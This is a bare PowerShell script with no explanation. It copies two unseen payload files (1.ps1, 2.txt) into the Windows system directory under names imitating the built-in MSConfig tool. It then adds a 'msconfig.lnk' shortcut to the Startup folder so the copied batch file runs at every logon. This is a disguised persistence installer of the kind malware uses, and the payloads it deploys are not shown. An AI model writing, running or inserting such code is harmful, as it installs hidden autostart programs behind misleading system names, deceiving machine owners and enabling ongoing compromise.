$mainPS1Path=[Environment]::SystemDirectory+"\MSConfig.ps1"
$mainBatPath=[Environment]::SystemDirectory+"\MSConfigbat.bat"
$mainShortcutPath=[Environment]::GetFolderPath("Startup")+"\msconfig.lnk"
function makeMain(){
    if(-not (Test-Path -Path $mainPS1Path)){
        New-Item -Path $mainPS1Path -Value (Get-Content -Path .\1.ps1)
    }
    else{
        Set-Content -Path $mainPS1Path -Value (Get-Content -Path .\1.ps1)
    }
        return $true   
}
function makeBat(){
    if(-not (Test-Path -Path $mainBatPath)){
        New-Item -Path $mainBatPath -Value (Get-Content -Path .\2.txt)
    }
    else{
        Set-Content -Path $mainBatPath -Value (Get-Content -Path .\2.txt)
    }
        return $true
}
function makeBatshortcut(){
    $WScriptShell = New-Object -ComObject WScript.Shell
    if(-not (Test-Path -Path $mainShortcutPath)){
        $Shortcut = $WScriptShell.CreateShortcut($mainShortcutPath)
        $Shortcut.TargetPath = $mainBatPath
        $Shortcut.Save()
    }
        return $true
}
function mainFunc () {
    makeMain
    makeBat
    makeBatshortcut
}
mainFunc